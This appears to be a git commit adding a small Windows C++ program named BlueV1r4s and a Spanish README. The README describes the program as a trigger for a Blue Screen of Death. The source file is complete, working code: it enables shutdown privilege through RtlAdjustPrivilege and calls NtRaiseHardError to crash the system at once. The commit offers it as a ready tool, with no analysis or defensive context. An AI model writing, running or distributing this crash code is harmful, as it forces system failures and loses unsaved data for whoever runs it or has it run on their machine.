c9501787dc68835309db13bf9e9a4930e9c76e16
unknown <aitorcastel@gmail.com>
2020-04-07 00:40:37 +0100

    first commit

---
+++ BlueV1r4s/BlueV1r4s.cpp
@@ -0,0 +1,16 @@
+#include <Windows.h>
+#pragma comment(lib, "ntdll.lib")
+
+EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStrinfParameterMask,
+	PULONG_PTR Parametes, ULONG ValidResponseOption, PULONG Response);
+
+int main()
+{
+	BOOLEAN bl;
+	unsigned long response;
+	RtlAdjustPrivilege(19, true, false, &bl);
+	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
+
+	return 0;
+}
---
+++ README.md
@@ -0,0 +1,6 @@
+<h2 align="center">
+  BlueV1r4s
+</h2>
+Programa que sirve de disparador de BSOD usando NtRaiseHardError en la función NativeAPI/ntdll.
+<br>
+Escrito en C++ y compilado en Visual Studio 2019.
